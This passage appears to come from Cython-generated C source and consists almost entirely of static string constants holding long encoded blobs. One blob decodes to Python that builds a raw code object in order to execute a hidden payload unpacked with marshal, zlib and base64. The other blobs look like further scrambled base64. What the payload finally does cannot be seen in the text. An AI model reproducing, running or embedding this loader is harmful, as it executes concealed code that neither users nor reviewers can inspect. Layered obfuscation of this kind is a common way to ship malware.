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";
static const char __pyx_k_RkRjlmUnVkMWRGQTUxRCtIRHBJMUhlMG[] = "RkRjlmUnVkMWRGQTUxRCtIRHBJMUhlMGkrWlFWYVlzUlp4cXR4WjJma2ZVdll2QW9Pb1BvNEt5RGZoQ2RRK2djZHZUTUl4aXpWOC9MWS9xUzNMQWlRK3FtUG96T0MrZ2NSV2VFVHdVNTZ6NDBVV1pHbkVVaFBZRlNFK2lzb0lPVFBVUm9hVzNaSEpEbksvbVNqUE5Za0oydTRUcFZGczVLSVVvcnNvOEw0TnlkdGxZeHRDZ3RucHI5VFZJZ2dTaXRjcHA5amZjdkswaEJvN1FLWlBZMjNxWGxyYWorSXQ1c2xhOVhnUG5MdExBcXAzMmc2dGJFRXhCOFRWdFJERXdJUkd2aWpJNUtMYzBZNmppMXJhUDJxL2VqZzN4SVI4dHdQVWtjbnRKTlM4bmo0TjNrM2hObXV6YzllV0V0MmhCeXZoVFZlMUgvajcrbWxpczVJTjRMYTlnZUY4MHVKNDYxb0hlV0tXWW42TFJ5dmFRYjgzd0pyNTJJNTB1N1JlU0MrajVlN0MvenNzNlkzVlQvSzBvSjJ0YWFFQndmTjVQZUR1UE9FOHJEdzdMM2pqdGJPVExTZExyUG1hSGpzM1pJUzNYa21EUkxwNTl3ZUR6eWNWb2NhMlQwdU54QUZKM1BDZEwwNFN1Q1BYMUkwM24zMFRubjBIK2MzYU4xUEpwYzFPZVEzcmRtTWlXN0cyWXllSm0zT3gxY3h1Z3VYZUowWVNhelFoMEtWL1F5R1ZvVDVjRjUxUUJWT1pQUk0xeDdVSXlWV2xDOXI1V05NdGNhUWk3NXR4V0NCYjdTWnEraUVjRzNPZnlDSzJndDBWa3FnN05xWjYyekpTMEZ3TllhTEwzQ1dkdmpZYlpvb3o2QVJmc2RwUEEzckRXNUdmR1lpRE9VdmFRYnZBUzZ3QkN0NzB5SnVQcXo3OGYrdHpwanB5RWtTU3MrY0NWTjBTcVY5RmxNK3VXdTVqVmZpYW83UXVHZjFoM2g4RS9jSS82VDRXaFUzTzBuaVg0OFBxczdKUCtuZFlmUC8zUDNpUDU4T0JDbDFUaFpjczloY1ZnSy9wL2dwOEVRSFA2WUQxUEdlZDNERXRYdFl6cFRqNjB6Q1JKZ1RzMFFESEZMd3JuY2JSajdtSzhQTlIrZjRXZCtheldGbXhRRmFBMk1Wci9JdkNpQ3ZONHliNDJ1QmZRWjFLYWM5Wm9XYTgwTS9USHZlTWhhTjBGM3FFTE1lZUdMS3MybnhrL2dHcFFuTnpSYzh1VFhadVdISE1KdjhKUWoxamdkVzIxbDdjaklXUWZvYzNHampYV3lMdEM5MmtHSDZ3WjlyZ2UwclE3dzkvWUxrTi9vWmdBaytxcW9aMGhzRDYxNEJWaC9QNjJEUVJwN3JhdDlkT1YvNUtkeHRXVjNtVWMrTE1YZGUzZFBHeTFRWDExT2ZlMG5QeS8vb0NjODZBay9RQ082VEtYcDVucXFSL0tnSy9rb1JIZDczUEVkTklQZWpjOUFWd21TQ2RodU5SK3BCaHQwbGVDWGc1WUpHUGpJQkd6b3hpZVgvcXBkK09RM2Z1OERZY2RQR093TzdwMzI0TDRUa1YrcDVIUEtpalhnZnRKamorQTdYZmFkNjhwYVdjc3JPVG1WSktzVW1oWTJ3L0tyRlZYZmtFK2FGNTg4TDhOWFVSSkdzV1Q1enREMDZYMWpiakduRnBqS2h1OWlRblBtQzhPNlVsakw4SW5NNVBqazdQVGs5R3hxY21JbWRTSTVNenM1bkMxV0NzYmNkSklUbCtVNjlvTDJLYXBlM2duZ0tKeW9pUXJSbVZvWVEzRTFhY2YzMHR4cFRsNlEyT3pFNUZ0cVRpMHJHaHIvN1BUS0YzRzdBWTNndDNGdlFyNmtGT1NUTzBHWkp4ZXlySUZHK3ZpWXNJRnBoM0NDQjgwNGZPQncwTTg0QThzSloraVlwZEtCN0xMS0J5aDNiTXJXRDFBME5sMXpCcG1YYkJDbFFZWk""EzcDN2SWRqbFdKMjBaM2tvMkdOT2tiVG5nVG96OWwxblBjbkNiNjl4aGpzVzJGTlFTY3ZPdzdIUEFMY1I1YjhDem44aWxCZHcxcWRiSEVYY0V2MVNETTdIQWQxVGlPQ2YrbjFQUlVRNndwOGVrK0wybXY5WEdsRXU0RVc1YmtTNUgrQnFsWUdyNEpJaDBZb0wrdjNrRDVBTlFCRHhESkRQajJ2ckxMUW1nUjRSb1B1U2hYclNoN1pCZGFUT0lEcTBHbVpSZkl0WkMyQlF4SWl5R0dzRmJHa0IzSWtEQnJVQkJzWEEzdzZvMGRFdmJJcEc2eTRsNmVRbHdRMEQ3dm82djlxS3N5RHIzZ1pFNjBPMGJDWDVvSVdDV0lKZWtPc2poTnJ6eEZMMEV4SWUzdlNCeEFDWmlFcHNMOGkxVlgwVzd1MEhIK1hQUkFzQld4Ky9aeUhmYnhtdFVLL3R6dE1Na3A4L3pRRlB1TThUTGhzZGlHK1VOOGM5d1NNNTVFcGF1TmRaaDN0ZEQ4V05pRFZMMDc5ckN3V2J6ZEpZeUdmTjA2QkZRRE9rQzNGeWJxM0FpemJPNldnM3BOOGxpY1NaVEVhWm0yZ0tNQ0VBdGRMSzNSd0JDeVIyUTBHRmlDQ2xKbWIwcjJQb2kwOVpOZmRPVWRja2pabDdyT2xwcmJDTXNJajROa0V2by80dVp2d1FuZmZRK1YxMHZtbkRsLzQrNXRiTlVjc0ZySGtOQ3ZSN2VQLzNFVEc2bTRMUytUcGtlZ29hVFhPZ1UwczVKYXZ1amswQkczVnN6UEZhYk5rc2NzRUZIZXZhRFhKdHZ6eFNyckZYSStoOEZaeS9SQXk0U0tCemxKYTNVOUpOQUp4ajRyNW5vVjhPMkRnR1JsOXRCQnZzUG50c3NCbjIwVFQwMkM4QU40bi9YK0FtSXBqL2xFclJCN0o3Q0JiNm4xaVNBWUtjUllLY3ZSYms3TE1nWnovRkgyd0tPUTMzT09SWU9mdllnV2ZPK1REUXhzYWMvVTdxL3NkeWZ1eWVCWGIvNXU3WEcrQk85c0Rhd1YzZ2Jvamc3dEF1Y0hkNE43Z3JSQzJ3RzdNbmMrNlcxb1c3ZHlHMEcwTHoxcVR3MzFKNUhNT3JIc2o3ZHdGK0EwK0IzMEFEL0FhK0hMRGdGM3dFdjBlYXdxLytJVHE3UWEvK0VUcE5ZRmQvaEE1TlRmMERkSWpCL1NFNkNMaTM5UzMwYmdzNEFXTkJLZG9sbmJHcDRoT0FOQzJWMWx3dzFiK0Zqb3VkdmI4YzdOVC9TTmlGMHlGZHFuVmNWVGNXaTRyT3JnQWgxdlZLeWVCNEdyU0luZnRic0pjQmJWUjBsWEJYQzA5NlZIVlhXN2VsUExaRWpvN3ZJbkVqeEQ0QTUyZUlmTDhsb1BidVFxd0VQNFRaQVF0c240ZmJIUVZ1NThjMXdSL0hXMzhoa0g3UUNOSjFldTg0TXNJZi9UL1VlMy85ZWZYZXJSYld6anEyMGVvb1ZxZi90cTdHV1NmcHYxMEFoRzFHdTJYOVNUb3ZBR0VmQUdFbitBR21iUjJXdGNLeGwydXdVSllwMEluYmdkZHhuWGdRNG5hQmhndmd5bVE0RGhJUURubENEdFhweHJHbnkxcmcrVGJveURHbzIyNm5iZytUbnovckVVOTQwQk0rYlBTQSswS2RqdXhLSG5VbExiRHFyZU9LZlFCV3ZiOFVMWG5raHY3YjJOMS94NGFVcHRqMWR4M3Nlc2ZCcm04NFVFYnFjTVNhRGdZR1JnYW9xS3FZTCt5dUdhdjNTN21pcmlZZ3FKellIZjd1SVV6NFFIZE9oOHY4RXc3bGREeW5vTGxueHJKQ1NnZnpLdE9Vc2d0eTZRQ0ZjTmgwbWFPai9YTEUrM3YxaUxmSFZXMzFEOUQ1KytnOFVhM1YvOENCdUwrNVp1dGFSZG9rTU9td1IzdUhRZEpGTnI1UkFEUmJSNFcxR0tRSEp5MG""Jod1diaXRwcEpiMG1selliZlV5emZSc2M2R1ROTmR2VDRrWHhKSVE4bjJicjROamJqVGdXOU9MWVg2RWQ1dmVlbFdwV29iL2ZFL1IvaGJqWFZEcHNTU1BlK0lIK1JRQnZDT1dJQWdicU5NNGdJaGxyQWRwNjJ3aFpKQUJ0dzJNV0NVQi9heDF0amJBNFlWOEthYURSc2hWRDIwMUVYc0MwVnRaaGtiTk93Sjg0Mm1zaXBoSEo3U0xiZGRMbmdLS0ZDWFVDdTBsd0ZMajdlU01BZGRMbVBHVTMrZmxUOW5qQ2ZaN3dYaUkrZlhXMHlKWGM0MHBhU05QaHNYWGZyUWI2RzJ6ZE96ZCs2bENuM2VJOEMzVWFhRXFkQUZ2bWkzbEZLMWk2NjRqUGpMNjhqT3NEaUNUZzMxQldpa1h5eDE1ZUtSck9uWkMxNTRvdmszM2RBU3lIZTJuLzAyZmhsL1lYdmpxYVZLOXFObUNGT2U0VVNIWUxNaXE3QlFHL3B5QWpYVTF4eEFXT0JsNUZzTktBUnE3MWRUTUlDYm9RNHN4cjFaTWNCeHRjZXNTQkJpZkh2T3FtcTdvNk1KTjBaOXJjRFUrUDRjWFhzQ0NJRjY4SVhDa05pL1BFbW1JU3Jta01QWmRhT3V6T2duMnRFU3Z3RDQzanNjTEt1SzZtQ3ZodHB6UnhucmVGdEEvdG9lRHNaNEZiVURYNjM4RUVSRTlrWEREdHRNRm15Uy9BQzFnVk1zSXl2SFlaa1Z6SlBHNzR0dnpid3J0SEVTcTJBdmdKcWszSDFPcmRPQkFkMzFhb0txM1NpL3VZV2MreFJnUGx1cnV6RFVZL0tYaUZJaHQzcmNtZ";
static const char __pyx_k_Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBl[] = "Xz0obGFtYmRhIHg6eCk7Y29kZT10eXBlKF8uX19jb2RlX18pO18uX19jb2RlX189Y29kZSgwLDAsMCwwLDEwLDY0LGInelx4MTZlXHgwMGVceDAxZFx4MDBceDgzXHgwMVx4YTBceDAyZVx4MDFkXHgwMVx4ODNceDAxXHhhMFx4MDNlXHgwMWRceDAyXHg4M1x4MDFceGEwXHgwNGRceDAzXHhhMVx4MDFceGExXHgwMVx4YTFceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwZFx4MDRTXHgwMFx4MDRceDAwZVx4MDV5L1x4MDFceDAwWlx4MDZceDAxXHgwMHpccmVceDA3ZVx4MDhlXHgwNlx4ODNceDAxXHg4M1x4MDFceDAxXHgwMFdceDAwWVx4MDBkXHgwNFpceDA2W1x4MDZkXHgwNFNceDAwZFx4MDRaXHgwNltceDA2d1x4MDF3XHgwMCcsKCdtYXJzaGFsJywgJ3psaWInLCAnYmFzZTY0JywgYidlSnpWZkd0d0hOZVZYbmZQZXpBWXZBRUNKTUVtU0VJRUJXQUdBNEFFU0lFVVNmQWxQa0NKbEdtTjVSMDM1amFBQnViRm5oNkM2QjE0WlZQT1BoeFoxRnJaVlZaaUZ2QzZVdEZXS3J1Vi9IRTUreU5KMVZaUytaR2tVdjZSbWtwVkVqdVZqV3AvMkZWWkp6YThsbkxPdWYyYTRZQVByNzJwWU5DM2I5OCs5OUgzM3Y3dWQrNDl0MzhnTlB6NTRYZ1pqdisxRnh3bU1ERW5wQVZWVklVdGlVbmI0Z05SaExCYlF1UmozeWNvZnFQODN4Y0Y0UWU3cFZMK0g2S2JDcDNGdEVobktTM1IyWmYyMGRtZjl0TTVrQTdRT1pnTzBqbVVEc0ZaeW9YemtYUkV4RFI4dVdpK0pkMUNmbjh1bG8rbFk2SVFFVmdnM2NxQzZUZ0xwZHRZT04zT0l1a09GazEzc3BaMEY0dWx1MW5yVnMreW9MWjlLTHduc3ZoN291VnJBMTgzK2RvZFg0Zmo2d1JmTy9tNm5MQnVKNnpIU2FYVHVkdnJoSFU3WVgzUEtMZm5HZVg2bjdGOEErK0oyMks2bCsxTjk3RjliUC9iUW5vUEcyUUg0TnpQWkhZUXpnTnNpQjJDODE1Mm1CMkI4ejQyekY2QTgzNTJsSTNBZVpBZFl5L0MrUUFiWldOd2xpOEpiSndsM2haWTRvR1VQc2lTYkFKQ2g3QkhqS1I0aHhnUmE1MjNWM1JWWVRlTHhkeUYrMnEyWWhSMUNHMDdYeXdVMUt5aEZRc1hkSjJDd3FXY1lpd1Y5YndaMnZ1RmlWT3pTZHN6WVh0U3RtZlM5a3pabm1uYmM5ejJuTWpYQlBPSW5NbGtQSWNzMjE0WnZGWkExQnl1d3NXYi9NaFVaZm5OaEN4WDRYWlY1ajhlUUhKeUJyeHlBdTdCalRjVDRQQi9Ma3NCS0plaG9NeWJrQmY2NlFLOGVKMndBNkk3NGhkMnhFTTc0aGNyWDRESyt2NWI3LytLL3FNMThaalpJWit0R0N0RlhUNHB2MVkwVjVTMXFMbEh2cWhrMWNWaWNRMENYOVlwZFB6K2hoazFCK1VyaGJLaExPdEszcjJWS1M0dGFWbE55VVVyNlY5cGVaVUJBSXJyUlZQTDVaVEU5SGhTUG5wTksxVHVuNUxQRnBoZTFKaDhmRHg1U3I3OCt0azdGNjdJbjd0eGEremE1SVI4cnFMbFdJSUhXbUduNVBWN0kvTFpVaW1uM2xFWHIycEdZbnJ5eFBqa2Nmbm8xY3UzcjE4YmxYUGFtaXBmVXJOcnhSSDVjNnBlaHQ2WW1JTDh6cS9veGJ5YU9BNTVqMDlPcHFiSEo1S3o4dlhpb3BaVDVWdktrcUpyZGtwdU5jRjFFbjZwaWZIWkUwNUJqNlltRTFUWXFaa2tLMm1uNUlua1RQTCt4TXhFeWk1LzQzUEE5UjMwWGo0""bHIyakhVOU1RdDJSa2J0NCtKYy9PcEdabVVsT3BrYXdYWEVOd3RNSnhIZ0gyZzdBZ1BQU1pQektFTFpIQjZ5NEtobVQ0UGhRZWtJOUpXLzVsZ016M1JDTkFrT0FIWDVCOEFTY3M2SVNGbXNpRm04aEZtc2hGbThpMU5KR0xOWkZyclpNTDJSRHRrUXZaWU0ySElDTnNSRDRFK01mNHJKMzhRZkozR0ZGd094OUZINGliUWxWZ1hmZUVoNkwrWnc5RlU2cXJqWlltdGRIU1VLcnVKbkxoSm5JOVRlU2lUZVI2NitSQ1RtMjBORHhsMzNNOXBWZ1ZyYWNjZ3BaMzVmZDQ1UHNmaFNtOTJGWXJHNkErZ3IxbEwvbmlEd1JSS0dRaGxYMlV5b1huVEdXL0o1VjVTR1dRVWxsNXpsUU9lRkk1QXFuSWxNcGRvNDFDWkNOT2NmMVlRNUJha0ZKRC8wR2UyaDM0TWVIV1U4OSt3V2gvS0c3OGMxSFlsRVRCSE5nMTNjNnE5S0h3S01MVGZnUGlia3BmbG5nYTNMOHVybVAvd2pxVDlLbTZ2aFZ0NkF0RFRwamJGdzdWeVVYSWQ3aUozSkZuVEcvNEdlVmVhSkx2MFNaeUkwNGZwRGJoVHc3UGk2M3IwLzlrMTU1NXpOTXpmVVpIMWZkQVpDK3VTVkJIUzd2VzlhamRocGlIMGJuVnRRMXQvKzcwcHIvcU03b2ZDR3pzSTJrelVQV3Y5ckR4YW9BbDNwRzJlcmVGelNCTFZvTnNvbCtnRm5oLzE5UlRQUFdIWWlIQUpvMCtpRFBWRCtoSXNmN0pyckdtZWF6Q1g3TGpkWEY4K29QbnhwRVQ3NG1Rd2t5L3NMVm5XNkNRWmpHYkljc3N4VHpadjN1c1pqaHppbUpCaWJmNm41QmZyRW5NbHlqbXhGTml4cHZFbkhONlV5ZWxjZm9KWlQ3VEpQN0xEdnJ4K0dmZCtGWS9IR0RuMlBrSDB0YmVxbS9ieG85NTh1MGpqT2g5d3JzY1pCZnNaN0xmYVFaWTRCY2UrQ0JtYkFMYXRmenRkUWpIM3h0T2YzZDZ2VXd0L3ozQU5KNUR4Sk1EK2k4MnhiUkwyNCsvUDVjcHBmL2lEWDA2dGxuSXRmK2hmeVBHeTdocm5Dczh6aHQybkVHSU05d1FKK3FKZy81WEd1SzBRNXlyRmtMMlB4OUMxdVBqeU5VYnRVQTJweXE2SGdDdVVoT2plcERPRXpxd0ZzSHNsbDh2QVpGaXFueFZsVy9xYWw2cjVJRzRwb0M0emlzbHhWaFRDa0RsZ0xCdFFPaWsyUzVmVjhxVnVzQXBNeWEvcHBhS3VnRmtjQmtDcG5mQ2tGaXVvdWhBdGMvc1JJRFhGWXRsVlQ2NUk4b2ZTM29Nc2sxTHlRbXpSNzZzNk11S1BGOVJJR1lPMHB4S0FqM3V0b0p2cXZvaWhVNWlhQnRlNTdYQzhuSUYyTnhhRkpLOXF1WVhsWndHbVJ3MER5SDNVK1N6V0xKNVRkR1ZGZlRCSTkxWlVZeXlVaXFOajQ5LzRzTUhYcm5QbHNlS0piVWdyeGhHcVh3eWtWaFh4cEYxcG1ZbVo2Wk96S1ltZ0RTZU1kVDd4dHc1cGJCOEpKVThwK1kwT0YzVHltcWhqTDd6dXBKZGc3UERRc0gvQnBlRlo4RVlXRzU0MUZiK3FDbFQrNVZtZWtzeEtwNWM0enpYU1hQMWJ5UFg2OVFta0cwYnozWnFKeWJmMFl1RlpTRHBwWXFoUjdEU0QvRG1nWWF0bEtHekxPdGEyZENWc2dadEpZT09JSnN2MmlYa09zL3NlREtaWEZjWFY0cVFMVFJldHBoUDZPb3l4RkwxaEhuWTZZUTNsTHd5S2wvSUsxcHVGUHByUWI2cGxNdnJSWjJOUjgwVDhpdmFtaUxmcWpCbFJiNEtPb2Q4UzFzdXlKV1NmRTNKVlZEeDBKWkFBQXBCOGFtRTBFdWk1bFhzV1JX""bVlTZkhVbHY5REh2VGJlaURsZnZnTXlDNTBnWW9kZ1Y2YWNaTEd6eDdMYWV0eURlS2VWRDRzSDVrcy9QeDF3czZLNVdBQy9QT2puVXFYNFZjSUpIclN1VmcxSXhZYjVoOFVnZTFUTmlKeTYrQURIYnFZaGxxOTJPcDVvTzdhUjlUNyswOFErMWxWMERmR2krdGxENFdhOEVTdkNENThrNTdtZXBtVFdFS3ZxMWxwUmJHT1FQc0VEdWRkdlpYM2JzQlF3YzF0QmFvbEpWbGRXY2Mza2hzK29JaTM4WncrYmJHbERYNW5GWlc1T3R3UjFrcnEyWDVvbVpVZE9nS1dpMVVzaDQvVE0wR0NtN2FYd0FQUENsdkFBZ0lxT2d6by9JdEEycXZERUZtaTN4TzFYUEtXZ1V2WW5peHJDeFdvTFpPMXZ5clJhMVFFNCticlo1U3lpZlRJZlYrU2ROVnR0TTJyeGhLZ2ovSXVISGZxSW5ybitDMFdNMlhMeTgvQlRQT0VtYVloNS9sSFlMZTM4NTcvL1JPbTExeFZ3cjNvRDBaTk56VllrRmR3MzVHVXk0SGFsS3hYQXVXTjZBejUydUJrcTRWakZvNGs4a1ZsNHVaakg2TTBQbGNUYnhaRTYvWEFocStSRFh4Y2syOFdoTmZyL2tOTGEvV0F1V2NxcFpxZnZXK1p0U2ltWXhDT1dZeXRjaUYrMW0xaE5NN05WOU9MV0I3M3Eyb1phTmNDOTFTeTZobzYvejVsMVVEcXErTWN2QW0xcUpaU01LQTRwcVF1S0VaT2JYbXg0ZXVCZFoxelZDeGVIbTFVSUVjd2xmVkRYb09IZEYwSkpUdVdNQy9aSkl";
static const char __pyx_k_yywo3L4Eab1GTEuowWArQu4Y3tmo0AmE[] = "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